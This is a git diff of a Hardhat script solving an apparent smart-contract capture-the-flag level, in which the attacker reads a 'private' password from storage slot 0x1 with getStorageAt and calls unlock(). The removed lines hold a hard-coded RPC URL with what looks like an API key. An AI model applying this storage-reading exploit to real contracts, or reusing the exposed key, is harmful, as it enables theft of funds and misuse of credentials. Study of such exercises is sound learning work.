@@ -2,28 +2,20 @@ import { ethers } from "hardhat";
 // import { deployContract } from "../../utils/deployContract";
 import { abi } from "../../artifacts/contracts/8.Vault/Vault.sol/Vault.json";
 import { Contract } from "ethers";
+import { displayResult } from "../../utils/displayResult";
 
-function setTargetContract() {
-  const contractAddress = "0x051aCcE2EBDB5a96a1EF2de1b608bde49a6F5Dd0";
-  return new Contract(contractAddress, abi);
-}
+const targetAddress = "0xFbb17596577321579daDf9eAB6D63CC2bC6e226C";
 
 async function main() {
   const [attacker] = await ethers.getSigners();
-  const provider = new ethers.providers.JsonRpcProvider(
-    "https://eth-rinkeby.alchemyapi.io/v2/TMfNFHkOWc5WIHWdkvGGWlmALUJmSW1v"
-  );
-  const password = await provider.getStorageAt(
-    "0x051aCcE2EBDB5a96a1EF2de1b608bde49a6F5Dd0",
-    "0x1"
-  );
-  const target = setTargetContract();
+  const password = await ethers.provider.getStorageAt(targetAddress, "0x1");
+  const target = new Contract(targetAddress, abi, attacker);
 
   const tx = await target.connect(attacker).unlock(password);
   await tx.wait();
 
   const locked = await target.connect(attacker).locked();
-  console.log("Success: ", !locked);
+  displayResult(!locked);
 }
 
 main().catch((error) => {
@@ -32,9 +24,12 @@ main().catch((error) => {
 });
 
 /* Explanation :
-gasLimit must be set manually because ethers has difficulties evaluating gas cost 
-when using delegate call.
-+ in the delegate contract there is a piece of code that might increase gas costs
+Private variables are stored in the contract storage. Storage slot can be accessed
+by anybody.
+First compute the storage slot:
+0x0 --> locked (bool)
+0x1 --> password (bytes32)
+Seconde use the rpc method getStorageAt with the contract address and the storage slot 
+and call the unlock function.
 
 */
-// 412076657279207374726f6e67207365637265742070617373776f7264203a29
